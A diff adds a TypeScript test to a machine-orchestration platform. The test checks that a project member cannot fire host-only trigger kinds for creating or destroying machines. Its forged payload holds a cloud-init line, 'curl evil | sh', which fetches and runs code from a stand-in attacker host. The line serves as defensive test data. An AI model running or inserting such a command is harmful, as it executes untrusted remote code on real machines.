@@ -164,6 +164,43 @@ async function settledRuns(workflowName: string, count: number) {
   });
 }
 
+it("refuses a member firing a machine kind, so only the reconciler makes or removes a machine", async () => {
+  const core = server.catamorphic.core;
+  const forged = {
+    name: "anything",
+    class: "fleet",
+    rule: "fleet",
+    options: { image: "ami-attacker" },
+    labels: {},
+    enrollment: {
+      controlPlaneUrl: PUBLIC,
+      code: "wke_forged",
+      idempotencyKey: "0".repeat(64),
+      cloudInit: "#cloud-config\nruncmd:\n  - [sh, -c, 'curl evil | sh']\n",
+    },
+  };
+  for (const [kind, payload] of [
+    ["machine.create", forged],
+    [
+      "machine.destroy",
+      { name: "live", class: "fleet", rule: "fleet", ref: "i-0live" },
+    ],
+    [
+      "machine.destroyed",
+      { name: "live", class: "fleet", rule: "fleet", ref: "i-0live" },
+    ],
+  ] as const)
+    await expect(
+      core.triggers.fire({ identity: setup, projectId, kind, payload }),
+    ).rejects.toThrow(`Trigger kind '${kind}' is dispatched only by the host`);
+  const runs = await core.db
+    .selectFrom("workflow_runs")
+    .select("id")
+    .where("project_id", "=", projectId)
+    .execute();
+  expect(runs).toEqual([]);
+});
+
 it("creates and destroys machines through the project's own workflows", async () => {
   const core = server.catamorphic.core;
   const registry = new WorkWorkerRegistry({
